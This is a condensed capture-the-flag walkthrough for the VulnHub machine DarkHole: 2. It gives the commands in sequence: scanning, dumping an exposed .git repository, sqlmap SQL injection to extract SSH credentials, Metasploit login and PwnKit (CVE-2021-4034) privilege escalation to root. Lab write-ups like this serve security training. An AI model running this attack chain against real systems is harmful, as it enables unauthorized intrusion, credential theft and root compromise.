# 🌑 DarkHole: 2 CTF – Summary Walkthrough

A text-based walkthrough of the **DarkHole: 2** vulnerable machine from VulnHub. This box showcases **Git repository leaks**, **SQL injection**, and **PwnKit (CVE-2021-4034) privilege escalation**.

## 🔍 Discovery
- Ran Nmap:
nmap -A -Pn <ip>

Open ports:
- 22 (SSH)
- 80 (HTTP)

## 📂 Enumeration
- Ran Gobuster:
gobuster dir -u http://<ip>/ -w /usr/share/wordlists/dirb/common.txt -x txt,log,php,git,html

- Found:
- `/.git`
- `/login.php`
- `/logout.php`
- `/dashboard.php`
- `/index.php`
- Enumerated `.git`:
gobuster dir -u http://<ip>/.git -w /usr/share/wordlists/dirb/common.txt -x txt,log,php,git,html

- Dumped repo:
git clone https://github.com/internetwache/GitTools.git
cd GitTools/Dumper
./gitdumper.sh http://<ip>/.git/ /tmp/repo-dump

- Found **admin credentials in login.php source code after reverting to a particular commit version**.

## ⚙️ Foothold
- Exploited SQL injection on `/dashboard.php`:
sqlmap -u "http://<ip>/dashboard.php?id=1"
--cookie="PHPSESSID=..." --dbs --batch
sqlmap -u "http://<ip>/dashboard.php?id=1"
--cookie="PHPSESSID=..." -D darkhole_2 --tables --dump --batch
sqlmap -u "http://<ip>/dashboard.php?id=1"
--cookie="PHPSESSID=..." -D darkhole_2 -T ssh --dump --batch

- Extracted SSH credentials:
username: jehad
password: fool

- Logged in via SSH using Metasploit:
use auxiliary/scanner/ssh/ssh_login
set USERNAME jehad
set PASSWORD fool
set RHOSTS <ip>
run

- Shell obtained → Upgraded to Meterpreter:
sessions
sessions -u 1

## 🔐 Privilege Escalation
- Ran local exploit suggester:
use post/multi/recon/local_exploit_suggester
set SESSION 2
run

- Selected `CVE-2021-4034 (PwnKit)`:
use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
set SESSION 2
run

- Root shell obtained

---

📖 **Full walkthrough with screenshots:**  
👉 [View the Medium post here](https://medium.com/@basitolasubomibalogun/darkhole2-vulnhub-ctf-full-technical-walkthrough-ad608c2517fa)
